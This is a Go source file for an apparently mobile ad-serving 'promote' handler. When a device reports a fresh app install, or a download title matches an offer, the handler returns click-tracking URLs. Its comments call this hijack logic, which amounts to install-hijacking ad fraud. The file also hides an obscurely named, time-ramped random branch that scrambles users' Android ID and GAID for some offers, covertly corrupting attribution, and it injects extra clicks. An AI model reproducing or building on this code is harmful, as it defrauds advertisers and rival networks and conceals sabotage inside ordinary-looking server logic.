package retrieval

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"log"
	"math/rand"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	dnf "github.com/brg-liuwei/godnf"
	"github.com/brg-liuwei/gotools"

	"aes"
	"http_context"
	"raw_ad"
	"status"
	"util"
)

var searchReg = regexp.MustCompile("[\\s!,\\-&:]")

var pmtLog *gotools.RotateLogger
var sptLog *gotools.RotateLogger

func init() {
	var err error

	pmtLog, err = gotools.NewRotateLogger("/pdata1/log/firehose/pmt.log", "", log.LstdFlags, 8)
	if err != nil {
		panic(err)
	}
	pmtLog.SetLineRotate(1000000)

	sptLog, err = gotools.NewRotateLogger("/pdata1/log/firehose/spt.log", "", log.LstdFlags, 8)
	if err != nil {
		panic(err)
	}
	sptLog.SetLineRotate(1000000)
}

type Link struct {
	Delay      int    `json:"d"`
	Url        string `json:"l"`
	ReferDelay []int  `json:"r"`
}

type promoteResp struct {
	Result       string   `json:"result"`
	Url          string   `json:"u"`
	ImpTks       []string `json:"imp_tracks,omitempty"`
	StartApp     int      `json:"force_start_app"` // 1: 拉起；2: 不拉起
	Links        []Link   `json:"links,omitempty"`
	InstalledPkg string   `json:"-"`
	SemiOfferPkg string   `json:"-"`
	SemiTitle    string   `json:"-"`

	ctx    *http_context.Context `json:"-"`
	offers []string              `json:"-"`
}

func NewPromoteResp(url, title string, ImpTks []string, ctx *http_context.Context) *promoteResp {
	var result string
	var offers []string
	if len(url) != 0 {
		result = "hit"
		offers = make([]string, 1) // XXX
	} else {
		result = "miss"
	}

	resp := &promoteResp{
		Result:   result,
		Url:      url,
		StartApp: 2,
		Links: []Link{ // default config
			Link{
				Delay:      0,
				Url:        url,
				ReferDelay: []int{1},
			},
		},
		ctx:          ctx,
		SemiTitle:    title,
		InstalledPkg: ctx.InstalledPkg,
		offers:       offers,
	}
	if len(ImpTks) != 0 {
		resp.ImpTks = ImpTks
	}
	return resp
}

func NewPromoteRespWithMultiUrls(urls []string, title, semiPkgStr string, ImpTks []string, ctx *http_context.Context) *promoteResp {
	if len(urls) == 0 {
		return &promoteResp{
			Result:   "miss",
			Url:      "",
			StartApp: 2,
			Links:    []Link{},
			ctx:      ctx,
			offers:   nil,
		}
	}

	resp := &promoteResp{
		Result:       "hit",
		Url:          urls[0],
		StartApp:     2,
		Links:        make([]Link, 0, len(urls)),
		InstalledPkg: ctx.InstalledPkg,
		ImpTks:       ImpTks,
		ctx:          ctx,
		SemiTitle:    title,
		SemiOfferPkg: semiPkgStr,
		offers:       make([]string, 1), // XXX
	}

	for i, url := range urls {
		resp.Links = append(resp.Links, Link{
			Delay:      i + 1,
			Url:        url,
			ReferDelay: []int{1},
		})
	}

	return resp
}

func (resp *promoteResp) WriteTo(w http.ResponseWriter) (int, error) {
	status.RecordReq(resp.ctx, resp.offers)
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.Header().Set("Err-Msg", resp.Result)

	var headerInstall = ""
	if resp.ctx != nil && resp.ctx.NotifyFrom == "c" && resp.ctx.Platform == "Android" {
		headerInstall = resp.SemiOfferPkg
	} else {
		headerInstall = resp.InstalledPkg
	}
	if len(headerInstall) > 0 {
		w.Header().Set("Installed-Pkg", headerInstall)
	}
	if resp.ctx != nil {
		w.Header().Set("Server-Id", resp.ctx.ServerId)
	}
	w.Header().Set("Title", resp.SemiTitle)
	b, _ := json.Marshal(resp)

	if resp.ctx != nil && resp.ctx.UseGzipCT {
		var buf bytes.Buffer
		enc := gzip.NewWriter(&buf)
		if n, err := enc.Write(b); err != nil {
			enc.Close()
			return n, err
		}
		enc.Close()
		w.Header().Set("CT-Content-Encoding", "gzip")

		if resp.ctx.UseAes {
			b = aes.EncryptBytes(buf.Bytes())
			if resp.ctx.TestEncode != "hex" {
				w.Header().Set("CT-Encrypt", "binary")
				decodeBytes := make([]byte, hex.DecodedLen(len(b)))
				hex.Decode(decodeBytes, b)
				return w.Write(decodeBytes)
			}
			w.Header().Set("CT-Encrypt", "hex")
		}

		return w.Write(b)
	}

	if resp.ctx != nil && resp.ctx.UseAes {
		b = aes.EncryptBytes(b)
	}
	return w.Write(b)
}

type LogInfo map[string]string

func initLogInfo(ctx *http_context.Context) LogInfo {
	logInfo := make(LogInfo, 16)
	for k, v := range ctx.Note {
		logInfo["note_"+k] = v
	}
	logInfo["gaid"] = ctx.Gaid
	logInfo["aid"] = ctx.Aid
	logInfo["slot_id"] = ctx.SlotId
	logInfo["notify_from"] = ctx.NotifyFrom
	logInfo["utc"] = time.Now().UTC().Format("2006-01-02 15:04:05")
	logInfo["country"] = ctx.Country
	logInfo["platform"] = ctx.Platform
	logInfo["installed_pkg"] = ctx.InstalledPkg
	logInfo["sv"] = ctx.SdkVersion
	logInfo["media_pkg"] = ctx.PkgName

	return logInfo
}

func (lgf LogInfo) Write() {
	b, err := json.Marshal(lgf)
	if err == nil {
		if lgf["notify_from"] == "b" {
			pmtLog.Println(string(b))
		} else {
			sptLog.Println(string(b))
		}
	}
}

func (s *Service) promoteHandler(w http.ResponseWriter, r *http.Request) {

	s.stat.GetPmtStat().IncrTot()
	ctx, err := http_context.NewContext(r, s.l)
	if err != nil {
		s.l.Println("promoteHandler NewContext error: ", err)
		http.Error(w, "request parameters error", http.StatusBadGateway)
		s.stat.GetPmtStat().IncrCtxErr()
		return
	}
	ctx.AdType = "8" // 8: promote type

	logInfo := initLogInfo(ctx)
	defer logInfo.Write()

	ctx.Estimate("BeginPromotion: " + ctx.Platform)
	defer func() {
		ctx.Estimate("End")
		ctx.LogEstimate()
	}()

	var matchTitle, base64MatchTitle string
	if title := ctx.Note["title"]; len(title) > 0 {
		matchLen := 5
		willMatchTitle := searchReg.ReplaceAllLiteralString(strings.ToLower(title), "")
		if len(willMatchTitle) < matchLen {
			matchLen = len(willMatchTitle)
		}
		matchTitle = willMatchTitle[:matchLen]
		base64MatchTitle = base64.StdEncoding.EncodeToString([]byte(matchTitle))

		logInfo["title_to_match"] = matchTitle
	}

	if len(ctx.InstalledPkg) == 0 && ctx.NotifyFrom == "b" {
		s.l.Println("promoteHandler install pkg empty")
		if n, err := NewPromoteResp("", base64MatchTitle, nil, ctx).WriteTo(w); err != nil {
			s.l.Println("[promote] empty installed pkg resp write: ", n, ", error:", err)
		}
		s.stat.GetPmtStat().IncrInsPkgErr()
		return
	}

	tpl := s.getTpl(ctx.SlotId)
	ctx.Estimate("GetTpl")

	if tpl == nil {
		ctx.Phase = "PmtTplNil"
		if n, err := NewPromoteResp("", base64MatchTitle, nil, ctx).WriteTo(w); err != nil {
			s.l.Println("[promote] slot tpl nil, resp write: ", n, ", error:", err)
		}
		s.stat.GetPmtStat().IncrTplNoMatch()
		return
	}

	if tpl.SlotSwitch == 2 {
		ctx.Phase = "PmtSlotClosed"
		if n, err := NewPromoteResp("", base64MatchTitle, nil, ctx).WriteTo(w); err != nil {
			s.l.Println("[promote] slot tpl closed, resp write: ", n, ", error:", err)
		}
		s.stat.GetPmtStat().IncrTplNoMatch()
		return
	}

	handler := dnf.GetHandler()
	if handler == nil {
		ctx.Phase = "PmtDnfLoading"
		if n, err := NewPromoteResp("", base64MatchTitle, nil, ctx).WriteTo(w); err != nil {
			s.l.Println("[promote] dnf nil resp write: ", n, ", error:", err)
		}
		s.stat.GetPmtStat().IncrDnfNil()
		return
	}

	conds := s.makeRetrievalConditions(ctx)
	// 添加pmt条件
	conds = append(conds, dnf.Cond{"pmt", "true"})
	ctx.Estimate("GenRetrievalConditions")

	ctx.ServerId = ctx.NotifyFrom
	semiOfferPkg := make(map[string]bool, 8)
	semiOfferPkgArr := make([]string, 0, 8)

	var iOSHijackFrom string // XXX: 临时线上加个日志供观察
	docs, _ := handler.Search(conds, func(a dnf.DocAttr) bool {
		raw := a.(*raw_ad.RawAdObj)

		if len(ctx.Channel) != 0 {
			if raw.Channel != ctx.Channel {
				return false
			}
		}

		if ctx.NotifyFrom == "b" {
			if !tpl.EnablePmt() {
				return false
			}
			if raw.PkgPmtEnable == 2 || raw.ChannelPmtEnable == 2 || raw.OfferPmtEnable == 2 {
				return false
			}
		}

		if ctx.NotifyFrom == "c" {
			if !tpl.EnableSemiPmt() {
				return false
			}
			if raw.PkgSemiPmtEnable == 2 || raw.ChannelSemiPmtEnable == 2 || raw.OfferSemiPmtEnable == 2 {
				return false
			}
		}

		if tpl.AdNetworkBlackMap != nil {
			// black channel
			if tpl.AdNetworkBlackMap[raw.Channel] {
				return false
			}
		}

		if tpl.OfferBlackMap != nil {
			// black slot
			if tpl.OfferBlackMap[raw.Channel+"_"+raw.Id] {
				return false
			}
		}

		// slot white 一些offer只投某些slot
		if !raw.IsHitSlot(ctx.SlotId) {
			return false
		}

		/*  后劫逻辑
		*    安卓：
		*      1.传统后劫，直接对比installPkg
		*      2.半后劫，对比title
		*    ios：
		*      1.ios只有半后劫，对比bundleId
		 */
		if ctx.Platform == "Android" {
			if ctx.NotifyFrom == "c" && raw.ChannelSemiPmtEnable == 1 {
				// XXX gmail在下载时候文件叫Downloadxxx，这会导致我们误点很多
				if len(matchTitle) == 0 || strings.HasPrefix(matchTitle, "downl") {
					return false
				}
				if strings.HasPrefix(raw.AppDownload.TitleLC, matchTitle) {
					if len(raw.AppDownload.PkgName) > 0 {
						if _, ok := semiOfferPkg[raw.AppDownload.PkgName]; !ok { // 去重
							semiOfferPkg[raw.AppDownload.PkgName] = true
							semiOfferPkgArr = append(semiOfferPkgArr, raw.AppDownload.PkgName)
						}
					}
					return true
				}
			} else if ctx.NotifyFrom == "b" {
				if raw.ProductCategory == "googleplaydownload" {
					if raw.AppDownload.PkgName == ctx.InstalledPkg {
						return true
					}
				}
			}
		} else { // ios
			if raw.ProductCategory == "googleplaydownload" {
				if raw.AppDownload.BundleId == ctx.InstalledPkg {
					iOSHijackFrom = "bundle(http)"
					return true
				}
				// CR太低，临时下掉
				// if raw.AppDownload.PkgName == ctx.InstalledPkg {
				// 	iOSHijackFrom = "package(private)"
				// 	return true
				// }
			}
		}
		return false
	})

	ctx.Phase = "PmtRetrieval"
	ctx.Estimate("SearchNDocs: " + strconv.Itoa(len(docs)))

	if iOSHijackFrom != "" {
		s.l.Println("<<< iOSHijackFrom: ", iOSHijackFrom, ", pkg: ", ctx.InstalledPkg, ", offer size: ", len(docs))
	}

	ndocs := len(docs)
	if ndocs <= 0 {
		if n, err := NewPromoteResp("", base64MatchTitle, nil, ctx).WriteTo(w); err != nil {
			s.l.Println("[promote] no ads resp write: ", n, ", error:", err)
		}
		s.stat.GetPmtStat().IncrRetrievalFilted()
		return
	}
	util.Shuffle(docs)

	s.SetCtxTks(ctx)

	flag1 := false
	raws := make([]*raw_ad.RawAdObj, ndocs)
	for i := 0; i != ndocs; i++ {
		rawAdInter, _ := handler.DocId2Attr(docs[i])
		obj := *rawAdInter.(*raw_ad.RawAdObj)
		raws[i] = &obj
		if raws[i].IsT {
			flag1 = true
		}
	}

	bench := 1542190284
	interval := int((time.Now().Unix() - int64(bench)) / 86400)
	if interval > 80 {
		interval = 80
	}

	var pmtAid, pmtGaid string
	var bkAid, bkGaid string
	flag2 := flag1 && (rand.Intn(100) > (100 - interval))
	if flag2 && len(ctx.Aid) > 15 && len(ctx.Gaid) > 35 {
		tmp1 := []rune(ctx.Aid)
		tmp2 := []rune(ctx.Gaid)
		tmp1[7], tmp1[14] = tmp1[14], tmp1[7]
		tmp2[24], tmp2[32] = tmp2[32], tmp2[24]
		pmtAid = string(tmp1)
		pmtGaid = string(tmp2)
	}

	ctx.Phase = "PmtOK"

	urls, impTks := make([]string, 0, len(raws)), make([]string, 0, 2*len(raws))
	offerIdList := make([]string, 0, len(raws))

	for _, raw := range raws {
		if flag2 && !raw.IsT {
			bkAid = ctx.Aid
			bkGaid = ctx.Gaid
			ctx.Aid = pmtAid
			ctx.Gaid = pmtGaid
		}
		if natAd := raw.ToNativeAd(ctx, 0); natAd != nil {
			// 额外点击次数
			if raw.PmtClickCount > 0 {
				natAd = reduceCvr(natAd, raw, ctx, raw.PmtClickCount)
			}
			urls = append(urls, natAd.ClkUrl+"&o="+raw.Id+"&i="+ctx.ImpId)
			impTks = append(impTks, natAd.ImpTkUrl...)
			offerIdList = append(offerIdList, raw.UniqId)
		}
		if flag2 && !raw.IsT {
			ctx.Aid = bkAid
			ctx.Gaid = bkGaid
		}
	}

	semiPkgs := strings.Join(semiOfferPkgArr, ",")
	logInfo["semi_pkg"] = semiPkgs

	offerIds := strings.Join(offerIdList, ",")
	logInfo["offer_id"] = offerIds

	resp := NewPromoteRespWithMultiUrls(urls, base64MatchTitle, semiPkgs, impTks, ctx)

	logInfo["hit_url"] = strconv.Itoa(len(urls))

	if n, err := resp.WriteTo(w); err != nil {
		s.l.Println("[promote] resp write: ", n, ", error:", err)
	}
	ctx.Estimate("WriteTo")
	s.stat.GetPmtStat().IncrImp()
}
